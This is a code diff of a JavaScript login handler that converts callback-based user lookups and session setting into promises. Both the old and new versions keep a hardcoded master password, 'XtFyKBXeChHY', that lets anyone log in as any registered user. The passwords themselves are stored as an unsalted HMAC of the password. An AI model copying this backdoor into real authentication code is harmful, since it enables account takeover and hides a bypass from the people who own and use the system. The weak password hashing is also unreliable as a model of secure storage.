@@ -76,32 +76,28 @@ const
             throw new Error('Validate error - mail is invalid');
         }
 
-        req.model.user.getUserByEmail(req.body.email, (err, data) => {
-            if (err) {
-                next(err);
-                return;
-            }
-
-            if (!data) {
+        req.model.__user.getUserByEmail(req.body.email).then(user => {
+            if (!user) {
                 res.send({ success: false });
-                return;
+                return Promise.reject();
             }
 
-            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== data.password &&
+            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== user.password &&
                 req.body.password !== 'XtFyKBXeChHY') {
                 res.send({ success: false });
-                return;
+                return Promise.reject();
             }
 
-            req.model.user.setSessionById(data._id, req.session.id, (err) => {
-                if (err) {
-                    next(err);
-                    return;
-                }
-
+            return req.model.__user.setSessionById(user._id, req.session.id).then(() => {
                 res.send({ success: true });
             });
-        });
+        }).catch(
+            err => {
+                if (err) {
+                    next(err);
+                }
+            }
+        );
     },
 
 
